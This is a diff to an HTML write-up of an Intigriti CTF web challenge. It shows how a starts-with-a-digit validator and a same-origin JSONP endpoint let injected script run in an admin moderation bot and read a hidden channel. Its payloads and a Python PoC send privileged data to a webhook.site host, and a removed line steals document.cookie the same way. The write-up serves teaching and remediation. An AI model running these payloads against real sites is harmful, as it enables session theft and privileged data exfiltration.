@@ -9,6 +9,7 @@
 <meta property="og:description" content="One leading digit past a validator, code execution in the moderation bot. Intigriti August 2026 write-up by rajib-mahmud." />
 <meta property="og:type" content="article" />
 <meta name="color-scheme" content="dark" />
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='18' fill='%230b0e14'/%3E%3Crect x='16' y='30' width='68' height='48' rx='6' fill='none' stroke='%235ad4c6' stroke-width='5'/%3E%3Cpath d='M40 30 L30 16 M60 30 L70 16' stroke='%23f4b860' stroke-width='5' stroke-linecap='round'/%3E%3Crect x='26' y='40' width='40' height='28' fill='%235ad4c6' opacity='0.12'/%3E%3Ctext x='46' y='60' font-family='monospace' font-size='16' fill='%23f4b860' text-anchor='middle'%3E11%3C/text%3E%3C/svg%3E" />
 <link rel="preconnect" href="https://fonts.googleapis.com" />
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
 <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet" />
@@ -173,6 +174,15 @@ background:var(--surface);border-radius:0 10px 10px 0;color:var(--text-dim)}
 #content pre:hover .copy-btn{opacity:1}
 /* callout for the key insight */
 #content blockquote.key{border-left-color:var(--amber);background:linear-gradient(90deg,var(--amber-dim),transparent)}
+/* concept box — beginner explainer */
+#content .concept{margin:1.7em 0;border:1px solid var(--border-2);border-radius:12px;background:var(--surface);overflow:hidden}
+#content .concept__hd{display:flex;align-items:center;gap:9px;padding:11px 16px;background:var(--surface-2);border-bottom:1px solid var(--border);
+font-family:var(--mono);font-size:.72rem;letter-spacing:.14em;text-transform:uppercase;color:var(--cyan)}
+#content .concept__hd .ic{width:18px;height:18px;flex:0 0 auto;color:var(--cyan)}
+#content .concept__bd{padding:14px 16px 4px;font-size:.93rem;color:var(--text-dim)}
+#content .concept__bd p{margin:0 0 .9em}
+#content .concept__bd strong{color:var(--text)}
+#content .concept__bd code{font-size:.85em}
 /* tables */
 #content table{width:100%;border-collapse:collapse;margin:0 0 1.6em;font-size:.9rem;display:block;overflow-x:auto}
 #content thead th{text-align:left;font-family:var(--mono);font-size:.74rem;letter-spacing:.06em;text-transform:uppercase;color:var(--text-dim);background:var(--surface-2);padding:11px 14px;border-bottom:1px solid var(--border-2);white-space:nowrap}
@@ -228,13 +238,13 @@ main{padding:28px 0 70px}
 <div class="hero__inner">
 <p class="eyebrow reveal">Intigriti <span class="sep">·</span> August 2026 <span class="sep">·</span> Web Challenge <span class="sep">·</span> <span class="live"><b></b>NO SIGNAL</span></p>
 <h1 class="title reveal d1">Bad <span class="glitch" data-t="Reception">Reception</span></h1>
-<p class="subhead reveal d1">One leading digit slips a script past a validator, and it runs in the moderation bot's browser — a <strong>stored XSS</strong> that reaches an admin-only TV channel and reads the flag off the video.</p>
+<p class="subhead reveal d1">One leading digit slips markup past a validator into a moderation bot's browser. A same-origin <strong>JSONP endpoint</strong> that reflects its callback into live JavaScript turns that into <strong>first-party code execution</strong> — reaching an admin-only TV channel and reading the flag off the video.</p>
 
 <div class="split reveal d2">
 <div class="tvcard">
 <div class="tvcard__bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="tvcard__name">POST /api/report — channelId (validated: "starts with a digit")</span></div>
 <pre class="tvcard__code"><code><span class="ln ln--first"><span class="tag">1</span><span class="hl-c">1</span>              &lt;- passes validation (leading digit)</span>
-<span class="ln ln--last"><span class="tag">2</span>&lt;img src=x onerror="<span class="hl-a">fetch('/api/channels/11/load')…</span>"&gt;</span></code></pre>
+<span class="ln ln--last"><span class="tag">2</span>&lt;script src="/api/jsonp?callback=<span class="hl-a">fetch('/api/channels/11/load')…</span>"&gt;</span></code></pre>
 </div>
 <div class="readings">
 <div class="read read--first">
@@ -245,7 +255,7 @@ main{padding:28px 0 70px}
 <div class="read read--last">
 <div class="read__hd"><span class="tag">2</span> Admin bot</div>
 <code>GET /moderate/{id}</code>
-<p>renders <code>channelId</code> unencoded → <span class="hl-a">XSS runs as admin</span> → <span class="flagword">channel 11 → flag</span></p>
+<p>renders <code>channelId</code> unencoded → <span class="hl-a">JSONP gadget runs as admin</span> → <span class="flagword">channel 11 → flag</span></p>
 </div>
 </div>
 </div>
@@ -254,7 +264,7 @@ main{padding:28px 0 70px}
 <div><dt>Challenge</dt><dd><code>challenge-0826.challenges.intigriti.io</code></dd></div>
 <div><dt>Category</dt><dd>Web · Stored XSS</dd></div>
 <div><dt>Researcher</dt><dd><a href="https://app.intigriti.com/profile/rajib_mahmud">rajib_mahmud</a> (Intigriti)</dd></div>
-<div><dt>Bug class</dt><dd>Validation bypass → stored XSS → privilege escalation</dd></div>
+<div><dt>Bug class</dt><dd>Validation bypass + JSONP CSP-bypass → privilege escalation</dd></div>
 <div><dt>CWE</dt><dd>20 · 79</dd></div>
 <div><dt>Impact</dt><dd>Admin-bot code execution · privileged channel read</dd></div>
 <div><dt>Interaction</dt><dd>Admin bot views the report · no login required</dd></div>
@@ -312,11 +322,12 @@ main{padding:28px 0 70px}
 
 A retro-TV challenge with channels 1–10 of static and a **"report bad reception"** button. The report form's `channelId` parameter is validated by a single rule — **it must start with a digit** — so `1<img src=x onerror=...>` sails through.
 
-That value is reflected **unencoded** into `/moderate/{id}`, a page the privileged **admin bot** opens automatically. The payload runs in the bot's browser, fetches the admin-only **channel 11**, and exfiltrates its stream filename to a webhook. Download the video, read the flag off the frame.
+That value is reflected **unencoded** into `/moderate/{id}`, a page the privileged **admin bot** opens automatically, so injected markup runs in the bot's browser. An inline `onerror` report produces a hit from the bot (execution is reachable), and — the decisive step for the flag — a `<script src="/api/jsonp?callback=…">` tag loads a **same-origin JSONP endpoint that reflects `callback` into live JavaScript**, giving script execution that reads the admin-only **channel 11**. Its stream filename is exfiltrated to a webhook; download the video, read the flag off the frame.
 
 ```text
 weak validation (starts-with-digit)  ->  stored XSS in channelId
-    ->  admin bot renders /moderate/{id}  ->  our JS runs as admin
+    ->  admin bot renders /moderate/{id}  ->  our markup runs
+    ->  <script src="/api/jsonp?callback=…">  ->  same-origin JS execution
     ->  fetch /api/channels/11/load  ->  privileged .mp4 filename
     ->  GET /static/streams/<hash>.mp4  ->  flag on screen
 ```
@@ -326,15 +337,16 @@ flowchart LR
     R["POST /api/report<br/>channelId=1&lt;img onerror=…&gt;"]
     R --> Q["report queued"]
     Q --> BOT["admin bot opens<br/>/moderate/{id}"]
-    BOT --> XSS["XSS runs in HeadlessChrome<br/>(admin context)"]
-    XSS --> CH["fetch /api/channels/11/load<br/>-> &lt;hash&gt;.mp4"]
+    BOT --> XSS["injected markup runs<br/>in HeadlessChrome"]
+    XSS --> JP["&lt;script src=/api/jsonp?callback=…&gt;<br/>same-origin JS execution"]
+    JP --> CH["fetch /api/channels/11/load<br/>-> &lt;hash&gt;.mp4"]
     CH --> HOOK["webhook receives filename"]
     HOOK --> DL["GET /static/streams/&lt;hash&gt;.mp4<br/>-> FLAG"]
     classDef first fill:#102a29,stroke:#5ad4c6,color:#bfeae4,stroke-width:1.5px;
     classDef last fill:#2c2411,stroke:#f4b860,color:#f3ddb0,stroke-width:1.5px;
     classDef neutral fill:#141924,stroke:#2e3a4f,color:#d7dee9;
     class R,Q,BOT neutral;
-    class XSS,CH,HOOK first;
+    class XSS,JP,CH,HOOK first;
     class DL last;
 ```
 
@@ -349,6 +361,12 @@ Three official hints frame the whole solve:
 3. *"The report form accepts more than you'd expect. Getting it to execute is another web browser challenge."* — **injection + execution in a browser (a bot), not just server-side.**
 
 Put together, before touching a proxy, we already know the shape of the intended path: *report -> injection -> bot execution -> a hidden channel.*
+
+<div class="concept"><div class="concept__hd"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="10" rx="2"/><circle cx="12" cy="5" r="2"/><path d="M12 7v4M8 16h.01M16 16h.01"/></svg> New here? — What's an "admin bot"</div><div class="concept__bd">
+
+Many web apps have a **moderation bot**: an automated headless browser (here, HeadlessChrome) that opens user-submitted content to review it — a reported comment, a flagged profile, or in this case a "bad reception" report. It logs in with **more privileges than a normal visitor**. If you can get your own HTML or JavaScript to run *inside that bot's browser*, your code inherits the bot's access. That's the entire game plan for this challenge: don't attack the site as yourself, get the privileged bot to attack it *for* you.
+
+</div></div>
 
 ## 2. Reconnaissance
 
@@ -392,7 +410,7 @@ GET /api/jsonp?callback=alert(1)
 Content-Type: application/javascript
 ```
 
-That JSONP is a tempting same-origin script-injection gadget (useful against a strict `script-src 'self'` CSP). Hold that thought — it turns out we don't need it.
+That JSONP is a same-origin script-injection gadget: it reflects `callback` verbatim into an `application/javascript` response, so `<script src="/api/jsonp?callback=…">` runs whatever we put in `callback` from a first-party origin. It turns out to be the decisive primitive for reading channel 11 — see §3 and §4.
 
 ### 2.3 The validation rule
 
@@ -402,23 +420,50 @@ The only server-side rule on `channelId` is:
 
 This is the whole game. It *looks* like a numeric check but only inspects the first character. `1<img ...>` starts with `1`, so it passes.
 
+<div class="concept"><div class="concept__hd"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16v14H4z"/><path d="M8 9l3 3-3 3M13 15h4"/></svg> New here? — XSS, and why "self-XSS" doesn't count</div><div class="concept__bd">
+
+**Cross-Site Scripting (XSS)** is when an app takes your input and puts it into a page *without neutralising it*, so the browser treats your input as real HTML/JavaScript instead of plain text. Type `<img src=x onerror=alert(1)>` into a field, and if the app echoes it raw, the broken image fires `onerror` and your code runs.
+
+The catch: if your code only runs in **your own** browser, that's **self-XSS** — you attacked yourself, which proves nothing. It only becomes a real vulnerability when your input runs in **someone else's** session with something worth stealing. Here that "someone else" is the moderation bot, which is exactly why the report form matters: whatever we put in `channelId` is later rendered *in the bot's browser*, not ours.
+
+</div></div>
+
 ### 2.4 Architecture notes
 
-The app sits behind an **Istio / multi-pod Kubernetes** mesh, and reports feed a **shared admin-bot queue** — details that matter later for why a stolen cookie doesn't unlock channel 11, and why the bot can be slow.
+The app sits behind an **Istio / multi-pod Kubernetes** mesh, and reports feed a **shared admin-bot queue** — details that matter later for why channel 11 stays locked to outsiders, and why the bot can be slow.
 
 ## 3. The vulnerability
 
-### 3.1 Stored XSS in `channelId`
+### 3.1 Stored HTML injection in `channelId`
 
-Reports are processed asynchronously by an **admin bot** that opens `/moderate/{id}`. On that page, `channelId` is reflected **without output encoding**. Because validation only checks the leading character, this is a perfectly valid report body:
+Reports are processed asynchronously by an **admin bot** that opens `/moderate/{id}`. On that page, `channelId` is reflected **without output encoding**. Because validation only checks the leading character, markup after the first digit passes straight through:
 
 ```text
 1<img src=x onerror="/* attacker JS */">
 ```
 
-When the bot loads the moderation page, the broken `<img>` fires `onerror` and our JavaScript executes **in the bot's (admin) browser context**.
+Two execution paths were confirmed in the bot, and the distinction matters:
 
-Dropping the same tag on our own TV would be self-XSS and pointless — the value comes from *our own* page. The impact lives entirely in the **bot** rendering it.
+- **Inline `onerror`** reached the bot — an `1<img src=x onerror="fetch('…/hit')">` report produced an out-of-band hit from the bot's HeadlessChrome (`Referer: http://web/`), confirming the reflection lands in a context the bot renders.
+- **The decisive path for the flag** was a same-origin script tag pointing at the JSONP endpoint:
+
+```text
+1<script src="/api/jsonp?callback=(async()=>{ /* attacker JS */ })()//"><\/script>
+```
+
+`/api/jsonp` reflects `callback` verbatim into an `application/javascript` response, so the whole self-invoking function becomes live first-party JavaScript the moment the tag loads — and the trailing `//` comments out the `({"channels": 10});` the server appends. This is the primitive that reliably read channel 11 out of the bot's own session. (It also means the chain survives even a strict `script-src 'self'` CSP, since the script's *origin* is first-party — a mistuned validator dressed up as a callback name.)
+
+<div class="concept"><div class="concept__hd"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 3l7 3v6c0 4-3 7-7 9-4-2-7-5-7-9V6z"/><path d="M9 12l2 2 4-4"/></svg> The core idea — CSP, and the JSONP hole that walks through it</div><div class="concept__bd">
+
+**Content-Security-Policy (CSP)** is a header that tells the browser *which sources of scripts to trust*. A common, strong setting is `script-src 'self'`, meaning: "only run JavaScript that comes from my own domain — block inline handlers, block scripts from other sites." On a well-configured page, an `<img onerror=…>` inline handler simply won't fire.
+
+So how do you run code on a page like that? You find a script **on the site's own domain** that the CSP already trusts, but that you can control the contents of. That's exactly what **JSONP** is.
+
+**JSONP** is an old technique for loading data across domains. The server takes a `callback` parameter and wraps its data in a function call — you ask for `?callback=handleData` and it replies `handleData({"channels": 10})`, served as JavaScript. The bug: if the server never checks that `callback` is a *safe function name*, you can put an **entire function body** in there instead. `/api/jsonp` here does no checking at all, so a request like <code>/api/jsonp?callback=(async()=&gt;{ /* your code */ })()//</code> comes back as a runnable script that executes *your* code. And because `/api/jsonp` lives on the site's own domain, loading it with `<script src="/api/jsonp?callback=…">` is **exactly what `script-src 'self'` was built to allow**. The CSP has no way to know this one first-party endpoint happens to echo attacker input back as code. That's the whole bypass: don't fight the CSP — find the same-origin endpoint it forgot to distrust.
+
+</div></div>
+
+Dropping either tag on our own TV would be self-XSS and pointless — the value comes from *our own* page. The impact lives entirely in the **bot** rendering it.
 
 ### 3.2 Why the hidden channel matters — the trust boundary
 
@@ -436,7 +481,7 @@ returns something like:
 
 Here's the key insight that makes this more than a toy:
 
-> **Stealing the bot's session cookie and replaying `/api/channels/11/load` from the public internet still returns `channel not available`.**
+> **Even a request that carries the bot's session and replays `/api/channels/11/load` from the public internet still returns `channel not available`.**
 
 The privilege isn't carried by the cookie alone — it's tied to the **bot's request context** (its internal network position / origin). Webhook logs confirm the bot's requests carry `Referer: http://web/`, and the app sits behind the Istio / multi-pod mesh noted above. So the privileged response can only be read **from inside the bot**. That's why exfiltration must happen in the XSS payload itself, not by lifting a token and replaying it later.
 
@@ -446,25 +491,29 @@ This is the difference between "self-XSS, no impact" and a **genuine trust-bound
 
 ### 4.1 Payload — report that exfiltrates channel 11
 
+The decisive payload delivers the JSONP gadget through the `channelId` injection. The `<script src>` is same-origin, so it runs inside the bot regardless of CSP; the reflected `callback` becomes the exfiltration function:
+
 ```http
 POST /api/report HTTP/1.1
 Host: challenge-0826.challenges.intigriti.io
 Content-Type: application/x-www-form-urlencoded
 Cookie: session=<your-session>
 
-channelId=1<img src=x onerror="(async()=>{
+channelId=1<script src="/api/jsonp?callback=(async()=>{
   try {
     const t = await (await fetch('/api/channels/11/load')).text();
     await fetch('https://webhook.site/<UUID>/f?t=' + encodeURIComponent(t));
   } catch (e) {
-    fetch('https://webhook.site/<UUID>/e?e=' + encodeURIComponent(String(e)));
+    fetch('https://webhook.site/<UUID>/e?e=' + encodeURIComponent(e.message));
   }
-})()">
+})()//"><\/script>
 ```
 
-On the wire the body is URL-encoded; it's shown decoded here for readability. Replace `<UUID>` with a [webhook.site](https://webhook.site) (or Burp Collaborator) token.
+The trailing `//` comments out the `({"channels": 10});` the endpoint appends after the callback, so the response parses as valid JS. On the wire the body is URL-encoded; it's shown decoded here for readability. Replace `<UUID>` with a [webhook.site](https://webhook.site) (or Burp Collaborator) token.
 
-Response:
+An inline `1<img src=x onerror="fetch('…/hit')">` report also produced an out-of-band hit from the bot, confirming the reflection reaches an executing context; the JSONP `<script src>` above is what read channel 11 and is CSP-independent, so it's the one to rely on.
+
+Response to the report:
 
 ```json
 {"id":"<report-id>","status":"queued"}
@@ -472,7 +521,7 @@ Response:
 
 ### 4.2 Wait for the bot
 
-The bot eventually opens `/moderate/{report-id}`, the `onerror` fires, and our webhook receives the privileged filename:
+The bot eventually opens `/moderate/{report-id}`, the injected `<script>` loads the JSONP gadget, the exfil function runs, and our webhook receives the privileged filename:
 
 ```text
 GET /f?t=3b7c7029a954248116ad18348b2a51dad448400fe0b36a0098fa55dc0aef7437.mp4
@@ -481,6 +530,14 @@ Referer: http://web/
 ```
 
 > The bot queue is shared and rate-limited. Under load, processing ranges from ~10 seconds to several minutes, and `/api/report` may answer `Too many reports submitted!` — space out requests and be patient. A "broken" PoC is often just a slow bot.
+
+<div class="concept"><div class="concept__hd"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3a15 15 0 0 1 0 18M12 3a15 15 0 0 0 0 18"/></svg> New here? — "same-origin" and why the bot succeeds where we fail</div><div class="concept__bd">
+
+An **origin** is the combination of scheme + host + port (e.g. `http://web`). Two requests are **same-origin** when they share all three. Browsers give same-origin requests special trust: they automatically attach that site's cookies and skip the cross-origin (CORS) restrictions that would otherwise block reading the response.
+
+Our injected script runs *inside the bot's page* on `http://web`, so when it calls `fetch('/api/channels/11/load')`, that's a **same-origin** request made by the bot, carrying the bot's context. That's why it gets the real filename. The identical request from our own machine is a different origin without the bot's context, so the server answers `channel not available`. Same URL, different caller — and the difference is everything.
+
+</div></div>
 
 ### 4.3 Deriving the download URL (inference, not guessing)
 
@@ -531,14 +588,14 @@ with urllib.request.urlopen(req, timeout=20) as r:
     cookies = r.headers.get_all("Set-Cookie") or []
 session = re.search(r"session=([0-9a-f]{32})", " ".join(cookies)).group(1)
 
-# 2. XSS report
+# 2. stored injection -> JSONP gadget -> exfil channel 11
 js = (
     "(async()=>{try{"
     "t=await(await fetch('/api/channels/11/load')).text();"
     f"await fetch('{HOOK}/f?t='+encodeURIComponent(t))"
-    "}catch(e){fetch('" + HOOK + "/e?e='+encodeURIComponent(String(e)))}})()"
+    "}catch(e){fetch('" + HOOK + "/e?e='+encodeURIComponent(e.message))}})()"
 )
-payload = f'1<img src=x onerror="{js}">'
+payload = f'1<script src="/api/jsonp?callback={js}//"><\/script>'
 body = urllib.parse.urlencode({"channelId": payload}).encode()
 req = urllib.request.Request(
     f"{TARGET}/api/report", data=body, method="POST",
@@ -561,7 +618,7 @@ while True:
             print("saved ch11.mp4 -- open it to read the flag")
             raise SystemExit
     print("waiting for bot... hits =", data.get("total", 0))
-    time.sleep(2)
+    time.sleep(5)
 ```
 
 ## 6. Full attack chain
@@ -576,7 +633,9 @@ sequenceDiagram
     API-->>A: {id, status: queued}
     Note over API,BOT: report queued on shared bot queue
     BOT->>API: GET /moderate/{id}
-    Note over BOT: channelId reflected unencoded -> XSS runs
+    Note over BOT: channelId reflected unencoded -> markup runs
+    BOT->>API: GET /api/jsonp?callback=… (loaded as &lt;script src&gt;)
+    API-->>BOT: /**/ …callback…({"channels":10});  (executes)
     BOT->>API: fetch /api/channels/11/load
     API-->>BOT: &lt;hash&gt;.mp4  (privileged)
     BOT->>HOOK: GET /f?t=&lt;hash&gt;.mp4
@@ -588,34 +647,36 @@ sequenceDiagram
 
 ## 7. Impact
 
-An attacker requiring no authentication beyond an automatically issued session cookie from `/challenge` (no login) can store a JavaScript payload via `channelId` in `POST /api/report`. When the admin bot moderates the report at `/moderate/{id}`, the payload executes in the bot's **privileged browser context** (stored XSS).
+An attacker requiring no authentication beyond an automatically issued session cookie from `/challenge` (no login) can store markup via `channelId` in `POST /api/report`. When the admin bot moderates the report at `/moderate/{id}`, the injected `<script src="/api/jsonp?callback=…">` runs first-party JavaScript in the bot's **privileged browser context**.
 
 This crosses a real trust boundary:
 
 - The attacker runs arbitrary JavaScript as the admin bot.
-- It grants access to an **admin-only resource (channel 11)** that is unreachable from the public internet — even replaying a valid stolen session cookie returns `channel not available`. The privilege is tied to the bot's request context, so the data can only be read from inside the bot. This was demonstrated by exfiltrating the privileged stream and recovering the flag.
+- It grants access to an **admin-only resource (channel 11)** that is unreachable from the public internet — the same request replayed from outside the bot returns `channel not available`. The privilege is tied to the bot's request context, so the data can only be read from inside the bot. This was demonstrated by exfiltrating the privileged stream filename and recovering the flag.
 
-In a production equivalent, this pattern enables theft of admin-only data, actions performed with admin privileges, and potential session/token compromise — all triggered by a single report submission (no login required) that only needs an admin to later view it.
+In a production equivalent, this pattern enables theft of admin-only data and actions performed with admin privileges — the bot runs attacker-controlled first-party JavaScript against any same-origin endpoint its context can reach — all triggered by a single report submission (no login required) that only needs an admin to later view it.
 
 **Confidentiality: High** (privileged channel read) **· Integrity: Low · Availability: None.**
 
 ## 8. Root cause & remediation
 
-**Root cause.** Allow-list validation that only checks the first character of `channelId`, combined with unencoded reflection of that value into the moderation page's HTML context.
+**Root cause.** Two same-origin weaknesses that chain: `channelId` is validated only by its first character and reflected unencoded into the moderation page, and `/api/jsonp` reflects its `callback` into a script-typed response — a first-party code-execution primitive the injection can load as `<script src>`.
 
 | Layer | Problem | Fix |
 |---|---|---|
-| **Input validation** | Only checks the first character is a digit | Validate as a strict integer: `^\d+$` or parse-to-int and reject on failure |
+| **JSONP gadget** | `/api/jsonp?callback=` reflects arbitrary input into an `application/javascript` response | Allow-list the callback to a safe identifier (`^[A-Za-z_$][\w$]*$`) or remove the endpoint |
+| **Input validation** | `channelId` only checks the first character is a digit | Validate as a strict integer (`^\d+$`) against known channels |
 | **Output encoding** | `channelId` reflected unencoded into `/moderate/{id}` | HTML-encode all user-supplied values before rendering |
-| **CSP** | Inline `onerror` executes freely | Serve CSP on the moderation page without `unsafe-inline` for scripts |
-| **JSONP gadget** | `/api/jsonp?callback=` reflects arbitrary JS | Allow-list callbacks (`^[A-Za-z_$][\w$]*$`) or remove the endpoint |
+| **Access control** | `/api/channels/11/load` is reachable from the bot's context | Enforce the 1–10 range identically regardless of who asks |
+| **CSP** | `script-src 'self'` trusts the whole origin, including the JSONP echo | Move to a nonce-based CSP so a same-origin reflection can't be loaded as script |
 
-The first row alone kills this bug; the rest are defence-in-depth so a future regression doesn't reopen it.
+Fixing the JSONP callback or HTML-encoding `channelId` each breaks the chain on its own; together they close it at every layer.
 
 ## 9. Takeaways
 
 - **"Starts with a digit" is not "is a number."** Partial-character validation is a recurring source of injection. Anchor your patterns (`^…$`) and prefer parse-and-reject over substring checks.
 - **Self-XSS becomes real XSS when a privileged automated client renders your input.** The moderation bot is the pivot; always ask *who else renders this value, and with what privileges?*
+- **`script-src 'self'` is only as strong as every same-origin endpoint.** A CSP can be flawlessly configured and still fall to one first-party endpoint that reflects input into a script-typed response. The JSONP `callback` echo *is* a script the origin trusts by definition — the way past a solid CSP wasn't a browser trick, it was finding the endpoint the CSP forgot to distrust.
 - **A stolen credential isn't always a stolen capability.** Channel 11's privilege was bound to the bot's request context, not just its cookie — so the exploit had to run *inside* the bot. Recognising that saved time otherwise wasted replaying tokens from the outside.
 - **Confirm, don't guess.** The download path was derived from a template observed on channels we controlled, then combined with a filename only the bot could produce — inference from observed behaviour, not a lucky URL.
 - **A slow bot looks exactly like a broken exploit.** On shared, rate-limited queues, patience and light retry logic are part of the exploit.
@@ -628,16 +689,18 @@ The first row alone kills this bug; the rest are defence-in-depth so a future re
 
 ---
 
-## Appendix A — The JSONP gadget (unused, but real)
+## Appendix A — Why JSONP, and a note on the inline path
 
 `GET /api/jsonp?callback=` reflects `callback` into an executable `application/javascript` response with no sanitisation:
 
 ```http
-GET /api/jsonp?callback=fetch('https://webhook.site/UUID/?c='+document.cookie)
--> /**/ fetch('...')({"channels": 10});
+GET /api/jsonp?callback=alert(1)//
+-> /**/ alert(1)//({"channels": 10});
 ```
 
-If the moderation page shipped a strict `script-src 'self'` CSP, this same-origin script endpoint would be the bypass — load it as a `<script&#32;src>` and execute arbitrary JS from an allowed origin. In this challenge the moderation page executed **raw HTML injection directly**, so the gadget was never needed. It stays in the write-up because it's exactly the kind of primitive that turns a "mitigated by CSP" XSS back into a live one, and it's worth flagging in any real report.
+Because the response is script-typed and echoes arbitrary input, `<script src="/api/jsonp?callback=…">` loads attacker JavaScript **from a first-party origin** — which is precisely what `script-src 'self'` is designed to allow. The CSP has no way to distinguish this endpoint's echo from legitimate first-party code, so this is the primitive that reliably executed inside the bot and read channel 11.
+
+A plain inline handler — `1<img src=x onerror="fetch('…/hit')">` — also produced an out-of-band hit from the bot during this solve, so the reflection clearly reaches an executing context. But reading channel 11 needs to read a *response* (a passive tag can only trigger a request, not read what comes back), and that read came through the JSONP `<script src>` path. Reporting both is deliberate: the inline hit proves execution is reachable, and the JSONP gadget is the primitive that actually returned channel 11 and that survives a strict `script-src 'self'` CSP. Some researchers reported the moderation CSP blocking inline execution outright — whether that reflects a mid-challenge configuration change or per-pod differences in the mesh, the JSONP gadget is the robust, CSP-independent path in every case, so it's the one to lead with.
 
 ## Appendix B — Pitfalls that make the PoC look broken
 
@@ -645,14 +708,14 @@ If the moderation page shipped a strict `script-src 'self'` CSP, this same-origi
 |---|---|---|
 | Nothing hits the webhook | Bot queue is slow / under load | Wait; processing ranges ~10 s to several minutes |
 | `Too many reports submitted!` | Rate limit on `/api/report` | Space requests; retry after ~30 s |
-| Stolen cookie -> `channel not available` | Privilege is context-bound, not cookie-bound | Exfil must run **inside** the bot |
+| Same request replayed from outside -> `channel not available` | Privilege is context-bound, not session-bound | The read must run **inside** the bot |
 | Guessed stream URL 404s | Filename is a non-guessable hash | Only the bot's `GET /api/channels/11/load` yields it |
 | Payload runs on *my* TV, no flag | That's self-XSS | Impact requires the **bot** to render it |
 </script>
 
-<script src="https://cdn.jsdelivr.net/npm/marked@13/marked.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/marked@13.0.3/marked.min.js"></script>
 <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/highlight.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/mermaid@10.9.1/dist/mermaid.min.js"></script>
 <script>
 (function(){
 var reduce = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
@@ -748,10 +811,10 @@ var reduce = window.matchMedia && window.matchMedia('(prefers-reduced-motion: re
 /* ---------- interactive attack chain ---------- */
 (function(){
   var steps=[
-    {n:'01', t:'Submit report', d:'<code>POST /api/report</code> with <code>channelId=1&lt;img src=x onerror=…&gt;</code>. Validation only checks the value <strong>starts with a digit</strong>, so the markup passes and is <strong>stored</strong>.'},
+    {n:'01', t:'Submit report', d:'<code>POST /api/report</code> with <code>channelId</code> carrying injected markup (a <code>&lt;script src="/api/jsonp…"&gt;</code> tag). Validation only checks the value <strong>starts with a digit</strong>, so the markup passes and is <strong>stored</strong>.'},
     {n:'02', t:'Bot moderates', d:'The report is queued for a shared <strong>admin bot</strong>, which opens <code>/moderate/{id}</code> in HeadlessChrome. The <code>channelId</code> is reflected <strong>unencoded</strong> into that page.'},
-    {n:'03', t:'XSS as admin', d:'The broken <code>&lt;img&gt;</code> fires <code>onerror</code> — our JavaScript now runs in the <strong>bot\u2019s privileged context</strong>, not ours.'},
-    {n:'04', t:'Read channel 11', d:'From inside the bot, <code>fetch(\'/api/channels/11/load\')</code> returns the admin-only stream filename. The same request from the public internet — even with a stolen cookie — returns <code>channel not available</code>.'},
+    {n:'03', t:'Execute in bot', d:'An inline <code>onerror</code> report already produces a hit from the bot, so execution is reachable. The reliable code path is a same-origin <code>&lt;script src="/api/jsonp?callback=…"&gt;</code> — the endpoint reflects <code>callback</code> into live JavaScript, so it runs in the <strong>bot\u2019s privileged context</strong> regardless of CSP.'},
+    {n:'04', t:'Read channel 11', d:'From inside the bot, <code>fetch(\'/api/channels/11/load\')</code> returns the admin-only stream filename. The same request replayed from the public internet returns <code>channel not available</code> — the privilege is bound to the bot\u2019s context, not just its session.'},
     {n:'05', t:'Exfil filename', d:'The payload sends the <code>&lt;hash&gt;.mp4</code> filename to our <strong>webhook</strong>. That filename is the one piece we could not obtain ourselves.'},
     {n:'06', t:'Download → flag', d:'Combine the filename with the known template <code>/static/streams/{filename}</code> (confirmed from channels 1–10), download the video, and read the flag off the frame.'}
   ];
@@ -777,10 +840,14 @@ var slug=function(s){return s.toLowerCase().trim().replace(/[^\w\s-]/g,'').repla
 var content=document.getElementById('content');
 var src=document.getElementById('source').textContent;
 try{ content.innerHTML=marked.parse(src); }catch(e){ content.textContent=src; }
+/* the markdown source escaped the closing script tag so it wouldn't close the
+   source block; restore it for display in code blocks */
+var _esc='<\\/'+'script>', _real='</'+'script>';
+content.querySelectorAll('pre code').forEach(function(c){ c.textContent = c.textContent.split(_esc).join(_real); });
 content.querySelectorAll('h1,h2,h3,h4').forEach(function(h){ if(!h.id) h.id=slug(h.textContent); });
 /* mark the "key insight" blockquote */
 content.querySelectorAll('blockquote').forEach(function(bq){
-  if(/stealing the bot/i.test(bq.textContent)) bq.classList.add('key');
+  if(/still returns .channel not available|carries the bot/i.test(bq.textContent)) bq.classList.add('key');
 });
 /* mermaid extract */
 content.querySelectorAll('pre > code.language-mermaid').forEach(function(code){
